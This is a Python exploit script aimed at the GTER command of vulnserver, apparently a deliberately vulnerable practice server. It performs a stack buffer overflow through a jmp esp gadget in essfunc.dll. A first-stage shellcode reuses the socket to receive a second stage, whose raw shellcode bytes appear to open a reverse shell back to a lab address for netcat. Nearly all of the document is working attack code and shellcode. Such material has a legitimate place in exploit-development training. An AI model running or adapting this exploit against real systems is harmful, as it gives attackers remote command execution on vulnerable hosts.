#!/usr/bin/python

import socket
import os
import sys
import struct
from time import sleep

host = "192.168.1.106"
port = 9999

size = 174
eip_offset = 151

# Badchar \x00
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (c:\Users\kartone\Desktop\vulnserver-master\essfunc.dll)
# Call to recv => CALL 0040252C


# SocketReuse to receive 2nd stage
#
# PUSH ESP # 0x54
# POP ECX # 0x59
# ADD CX, 0x188  #\x66\x81\xC1\x88\x01
# PUSH ESP #\x54
# POP EDX # \x5a
# SUB DL, 0xb0 \x80\xEA\xB0
# MOV ESP, EDX # \x89\xd4
# XOR EAX, EAX # \x31\xc0
# PUSH EAX   ; 1 param \x50
# INC AH # \xfe\xc4
# SHL AH, 4 # \xc0\xe4\x04
# PUSH EAX ; 2 param \x50
# PUSH ESP # \x54
# POP EAX # \x58
# ADD EAX, 0x4c #\x83\xc0\x4c
# PUSH EAX ; 3 param \x50
# PUSH DWORD PTR DS:[ECX] ; 4 param \xff\x31
# MOV EAX, 0x40252CAA # \xB8\xAA\x2C\x25\x40
# SHR EAX, 8 # \xC1\xE8\x08
# CALL EAX # \xff\xd0

shellcode  = "\x54\x59\x66\x81\xC1\x88\x01"
shellcode += "\x54\x5a\x80\xea\xb0\x89\xd4"
shellcode += "\x31\xc0\x50\xfe\xc4\xc0\xe4\x04\x50"
shellcode += "\x54\x58\x83\xc0\x4c\x50"
shellcode += "\xff\x31"
shellcode += "\xB8\xAA\x2C\x25\x40\xC1\xE8\x08\xff\xd0"

nop_align = "\x90" * 3

buffer  = ""
buffer += nop_align
buffer += shellcode
buffer += "\xCC" * (eip_offset - len(buffer))
buffer += struct.pack('<L', 0x625011d3)
# short jump could be use but I wanted to try another jump-style
buffer += "\x54\x5b\x80\xEB\x9b\xff\xe3" # PUSH ESP, POP EBX, SUB bl,155, jmp ebx
buffer += "\x41" # padding
#buffer += "A" * (size - len(buffer))

command = "GTER " + buffer

payload_size = 1000

payload  = ""
payload += "\x31\xd2\x89\xe2\x83\xea\x38\x8b\x12\x66\xba\x2a\xc8\x31\xc0\x50\x50\x50\x31\xdb\xb3\x06\x53\x40\x50\x40\x50\x89\xd3\x31\xc0\xff\xd3\x96\x66\xbb\xdd\x6b\x93\x68\xc0\xa8\x01\x68\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2\x6a\x10\x52\x56\xff\xd0\x31\xd2\x89\xe2\x81\xea\x9c\xf9\xff\xff\x8b\x12\x66\xba\x72\x10\x89\xd7\xba\x63\x63\x6d\x64\xc1\xea\x08\x52\x89\xe1\x31\xd2\x83\xec\x10\x89\xe3\x56\x56\x56\x52\x52\x31\xc0\x40\xc1\xc0\x08\x50\x52\x52\x52\x52\x52\x52\x52\x52\x52\x52\x31\xc0\x04\x2c\x50\x89\xe0\x53\x50\x52\x52\x52\x31\xc0\x40\x50\x52\x52\x51\x52\xff\xd7"
payload += "C" * (payload_size - len(payload))

#payload = "\x90" * 100

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+] Connecting to the server..."
s.connect((host,port))
print s.recv(1024)
print "[+] Sending evil payload..."
s.send(command)
print "[+] Sending second payload..."
sleep(3)
s.send(payload)
print "[+] Second payload sent! Check your netcat..."
print s.recv(1024)
s.close()
